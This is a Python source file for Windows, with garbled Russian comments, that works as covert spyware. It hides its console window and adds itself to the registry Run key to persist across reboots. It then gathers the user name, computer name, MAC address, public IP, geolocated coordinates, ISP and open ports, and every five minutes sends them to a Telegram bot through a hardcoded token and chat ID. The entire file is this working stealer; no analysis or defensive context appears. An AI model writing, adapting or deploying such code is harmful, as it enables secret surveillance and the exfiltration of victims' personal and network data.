import os
import sys
import json
import ctypes
import socket
import struct
import winreg
import requests
import platform
import subprocess
from uuid import getnode
from threading import Timer

# ====== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ======
TELEGRAM_BOT_TOKEN = '7266701740:AAEBLCvcslTg1rEMuafNnwYU3XJNmuZtOuc'
TELEGRAM_CHAT_ID = '6114034375'
CHECK_INTERVAL = 300  # –ò–Ω—Ç–µ—Ä–≤–∞–ª –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (5 –º–∏–Ω—É—Ç)
# ==========================

def hide_console():
    """–°–∫—Ä—ã—Ç—å –∫–æ–Ω—Å–æ–ª—å–Ω–æ–µ –æ–∫–Ω–æ"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def add_to_startup():
    """–î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É Windows"""
    try:
        app_path = os.path.abspath(sys.argv[0])
        app_name = os.path.basename(app_path)
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE) as key:
            
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{app_path}"')
    except Exception:
        pass

def get_public_ip():
    """–ü–æ–ª—É—á–∏—Ç—å –ø—É–±–ª–∏—á–Ω—ã–π IP-–∞–¥—Ä–µ—Å"""
    try:
        return requests.get('https://api.ipify.org').text
    except Exception:
        return "N/A"

def get_geolocation():
    """–ü–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –ø–æ IP"""
    try:
        response = requests.get('http://ip-api.com/json/').json()
        return {
            'IP': response.get('query', 'N/A'),
            'Country': response.get('country', 'N/A'),
            'Region': response.get('regionName', 'N/A'),
            'City': response.get('city', 'N/A'),
            'ZIP': response.get('zip', 'N/A'),
            'Lat': response.get('lat', 'N/A'),
            'Lon': response.get('lon', 'N/A'),
            'ISP': response.get('isp', 'N/A'),
            'ORG': response.get('org', 'N/A'),
            'AS': response.get('as', 'N/A')
        }
    except Exception:
        return None

def get_open_ports():
    """–ü–æ–ª—É—á–∏—Ç—å –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã (—Ç–æ–ª—å–∫–æ LISTENING)"""
    try:
        result = subprocess.run(
            ['netstat', '-ano'],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        ports = set()
        for line in result.stdout.splitlines():
            if 'LISTENING' in line:
                parts = line.split()
                if len(parts) >= 2:
                    addr = parts[1]
                    if ':' in addr:
                        port = addr.split(':')[-1]
                        if port.isdigit():
                            ports.add(port)
        return sorted(ports, key=int)
    except Exception:
        return []

def get_system_info():
    """–°–æ–±—Ä–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ"""
    return {
        'Computer': platform.node(),
        'OS': f'{platform.system()} {platform.release()}',
        'Arch': platform.machine(),
        'User': os.getlogin(),
        'MAC': ':'.join(("%012X" % getnode())[i:i+2] for i in range(0, 12, 2))
    }

def send_telegram(message):
    """–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram"""
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

def collect_and_send():
    """–°–æ–±—Ä–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ Telegram"""
    # –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
    geo = get_geolocation()
    ports = get_open_ports()
    system = get_system_info()
    public_ip = get_public_ip()
    
    # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    msg = "<b>üñ•Ô∏è System Information</b>\n"
    msg += f"‚Ä¢ Computer: {system['Computer']}\n"
    msg += f"‚Ä¢ User: {system['User']}\n"
    msg += f"‚Ä¢ OS: {system['OS']} ({system['Arch']})\n"
    msg += f"‚Ä¢ MAC: {system['MAC']}\n\n"
    
    msg += "<b>üåê Network Information</b>\n"
    msg += f"‚Ä¢ Public IP: {public_ip}\n\n"
    
    if geo:
        msg += "<b>üìç Geolocation</b>\n"
        msg += f"‚Ä¢ IP: {geo['IP']}\n"
        msg += f"‚Ä¢ Location: {geo['City']}, {geo['Region']}, {geo['Country']}\n"
        msg += f"‚Ä¢ ZIP: {geo['ZIP']}\n"
        msg += f"‚Ä¢ Coordinates: {geo['Lat']}, {geo['Lon']}\n"
        msg += f"‚Ä¢ ISP: {geo['ISP']}\n"
        msg += f"‚Ä¢ Organization: {geo['ORG']}\n\n"
    
    msg += "<b>üîå Open Ports</b>\n"
    msg += f"‚Ä¢ Count: {len(ports)}\n"
    msg += f"‚Ä¢ Ports: {', '.join(ports[:25])}"
    if len(ports) > 25:
        msg += f" +{len(ports)-25} more"
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è
    send_telegram(msg)
    
    # –ü–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–ª–µ–¥—É—é—â–µ–≥–æ –∑–∞–ø—É—Å–∫–∞
    Timer(CHECK_INTERVAL, collect_and_send).start()

def main():
    # –°–∫—Ä—ã—Ç—å –∫–æ–Ω—Å–æ–ª—å
    hide_console()
    
    # –î–æ–±–∞–≤–∏—Ç—å –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É
    add_to_startup()
    
    # –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —Å –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º
    collect_and_send()

if __name__ == '__main__':
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥—É–±–ª–∏–∫–∞—Ç–æ–≤ –ø—Ä–æ—Ü–µ—Å—Å–∞
    if getattr(sys, 'frozen', False):
        app_path = os.path.dirname(sys.executable)
    else:
        app_path = os.path.dirname(os.path.abspath(__file__))
    
    lock_file = os.path.join(app_path, '~system_report.lock')
    
    try:
        if os.path.exists(lock_file):
            sys.exit(0)
        open(lock_file, 'w').close()
        main()
    except Exception:
        pass
